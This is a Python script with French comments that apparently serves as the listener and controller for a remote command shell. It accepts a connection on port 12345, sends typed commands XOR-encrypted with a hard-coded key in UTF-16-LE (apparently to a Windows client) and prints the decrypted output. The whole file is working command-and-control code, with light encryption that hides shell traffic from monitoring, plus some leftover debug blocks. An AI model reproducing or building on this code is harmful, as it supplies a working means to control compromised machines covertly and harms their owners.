import socket


def XOREncryption(data,key):

    result = ""
    char_xor = ""

    for x in range(len(data)):
       
        current = data[x]

        current_key  = key[x % len(key)]

        char_xor = chr(ord(current) ^ ord(current_key))
        
        #print("i: ",i,"current: ",current, " | current key: ", current_key, " | char xor",char_xor )

        result += char_xor

    return result

    #print("result: ",result)
    


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

MY_KEY = """ba38fab1b592c8f4b1fbbe8d915ee009a840efe504e3a833d0d8afae3b9ea148c859a8e8441877a0721d54f92fccbf12241007253cd6468194484e310798c01d8874dab3c4daa2c3ad612b7ba79ddc5b7ae80de0190f6842d6540da4b5b66c08987f8a15b3f5b80c588e42d1b6c9f149e99cc3c145cd31edaa25b095a6d509df93743a4861929533582d418aa3a766de439e938b7302001e17a6b4691480c4520a5e3a3b31012a003f7ced0ae59936953356f04b92b0e81b9f5b3703130d98118df5bdcc57e0f632b01b443a02bd23fc2f83ca27f9be70cdc657e8f4d74095f5dd88a4c88519db28a45e2e9e4ff714715d6ba53f1a88579f7f47e421b4a3526d40ead58521fbc0b56d373dce956fbb5a7d85f44e24085289b02e4782c3ed1154277fdc56467c1fe08a89d43e96ad2e73f4246c4e9238d660cf85dbc034543a13830dafb383ba61999de8eaee11ac9fa69b170461b241be69e0213e2a3f860edb29d3a1baf0f8a31b577d5893f13ca7377f0aa1bc433ff212e1e7c11cb2ad210df750cdcb6b3202655b215f7abca0f7f85803444e4fb06766a668975e7aa216abc8fdcda3bc7e2797a819b4a1eeccba75bdb49e2e0832ab171c73911362f1384480ca3152399c52b14deefc20a7ddb5e7cc9379688b37af6a42d54a32a85c20b86c4aa86361757e34e66ab0c13e7270788dc097d3db859b0474e4305dc5ffb51d"""
sock.bind(("",12345))
sock.listen(5)



uni = "Ελληνικά J"
uni_encode = "Ελληνικά".encode()

conn,address = sock.accept()

print("CONNECT: {}:{}".format(address[0], address[1]))

tmp = ""
result = ""
while True:
    
    inp =  input(">")
    print("commande: ", inp)
    
    cmd_xor = XOREncryption(inp, MY_KEY)
    conn.send(cmd_xor.encode("utf-16-le"))
    
    while True:

        result_xor = conn.recv(20000)
    
        result = XOREncryption(result_xor.decode("utf-16-le"),MY_KEY)
        print("--->",result)
        
        print("len result: ",len(result))  
        print("result Xor: ",len(result_xor))  
        if(result == "\r\n"):
            print("bye")
            break
    

'''
    ok 
    print("wait..")
    data = conn.recv(4096).decode("utf-16-le")
    print(data)
    print("len: ",len(data))
    print("\n\n")
    inp = "абвгдеж эюя абвгдеж эюя  fántǐzì".encode("utf-16-le")  #https://stackoverflow.com/questions/13499920/what-unicode-encoding-utf-8-utf-16-other-does-windows-use-for-its-unicode-da#:~:text=1%20Answer&text=The%20values%20stored%20in%20memory,16%20little%2Dendian%2C%20always.
    conn.send(inp)
    print("send: ", inp)
    print(len(inp.decode("utf-16-le")))
    #https://stackoverflow.com/questions/46799465/why-my-applicaion-cannot-display-unicode-character-correctly
'''

'''
Il faudrait a partir d'un nombre chiffrer via xor et non a partir d'un char.

https://www.educative.io/edpresso/how-to-convert-strings-to-bytes-in-python
Un objet byte est une séquence d'octets.
'''